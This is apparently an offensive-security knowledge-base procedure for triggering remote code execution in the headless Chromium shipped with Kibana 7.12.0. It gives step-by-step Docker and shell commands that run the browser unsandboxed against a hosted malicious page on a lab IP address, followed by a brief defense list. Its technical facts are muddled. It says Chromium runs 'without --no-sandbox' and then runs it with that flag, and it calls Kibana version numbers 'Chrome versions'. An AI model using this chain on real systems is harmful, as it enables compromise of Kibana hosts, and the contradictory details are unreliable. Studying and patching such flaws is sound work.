---
id: proc-run-kibana-test
tags:
  - docker
  - chromium
  - rce-test
type: procedure
tools:
  - '[[tools/Docker]]'
  - '[[tools/Chromium-headless_shell]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/docker-run-kibana-bash]]'
  - '[[commands/cd-to-chromium-directory]]'
  - '[[commands/headless-shell-load-url]]'
verified: false
platforms:
  - Linux
  - Docker
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:23:37.256Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Run-Kibana-Docker-Container-and-Test-Chromium

## Summary

This procedure launches a Kibana 7.12.0 Docker container, navigates to the embedded Chromium binary, and executes it without sandboxing to load a malicious URL, demonstrating RCE in the reporting plugin's browser.

## Description

Kibana ships with a headless Chromium for PDF reporting, invoked without --no-sandbox for compatibility, exposing it to RCE exploits in Chrome versions 7.11/7.12. This step tests the vulnerability directly by running the binary against the hosted payload. Expected outcomes include command execution like file writes. Requires Docker installed and the malicious HTML hosted.

## Requirements

1. Docker installed and running.
2. Malicious HTML hosted and accessible.
3. Target image: docker.elastic.co/kibana/kibana:7.12.0.
4. Interactive terminal access.

## Defense

Defensive measures and detection strategies:

- Enable sandboxing in Chromium configurations.
- Update Kibana to patched versions (>7.12).
- Monitor Docker container executions for unusual binary runs.

## Objectives

1. Access Kibana's embedded Chromium.
2. Trigger RCE via vulnerable browser invocation.
3. Validate exploit chain start.

## Instructions

### Step 1: Launch Container

**Context**: Start interactive Kibana container to access internals.

**Command** ([[commands/docker-run-kibana-bash]]):
```bash
docker run --rm -it docker.elastic.co/kibana/kibana:7.12.0 bash
```

> Enters bash prompt inside container. Expected output: 'bash-4.4#' prompt.

### Step 2: Navigate to Chromium

**Context**: Move to the reporting plugin's Chromium directory.

**Command** ([[commands/cd-to-chromium-directory]]):
```bash
cd ./x-pack/plugins/reporting/chromium/headless_shell-linux_x64/
```

> Changes directory. Expected output: Prompt in new path.

### Step 3: Execute Headless Shell

**Context**: Run Chromium without sandbox to load malicious URL.

**Command** ([[commands/headless-shell-load-url]]):
```bash
./headless_shell --no-sandbox http://192.168.0.154:8009/alexb-says-hi.html
```

> Triggers exploit. Expected output: Locale warnings, RCE execution; interrupt with CTRL-C.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/docker-run-kibana-bash]]
- [[commands/cd-to-chromium-directory]]
- [[commands/headless-shell-load-url]]

## Tools Used

- [[tools/Docker]]
- [[tools/Chromium-headless_shell]]

## Tags

- docker
- chromium
- rce-test
